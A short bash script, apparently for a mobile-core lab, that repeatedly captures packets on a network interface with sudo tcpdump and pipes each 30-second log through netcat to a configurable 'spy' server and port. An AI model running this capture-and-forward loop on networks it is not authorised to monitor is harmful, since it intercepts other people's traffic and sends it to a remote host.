interface="ogstun"
logfile="$interface.log"
spy_server="10.0.31.1"
spy_port="1234"

while getopts "i:s:p:" opt; do
        case $opt in
		i)
			interface="$OPTARG"
			;;
		s)
			spy_server="$OPTARG"
			;;
		p)
			spy_port="$OPTARG"
			;;
        \?)
            echo "Invalid option: -$OPTARG valid options are -i interface to log, -s spy ip, -p spy port" >&2
            exit 1
            ;;
        esac
done


while true

do 
 	sudo tcpdump -i $interface -l >> $logfile &
	sleep 30
	killall tcpdump
	cat $logfile | nc -q 2 $spy_server $spy_port
	echo ""> $logfile
done

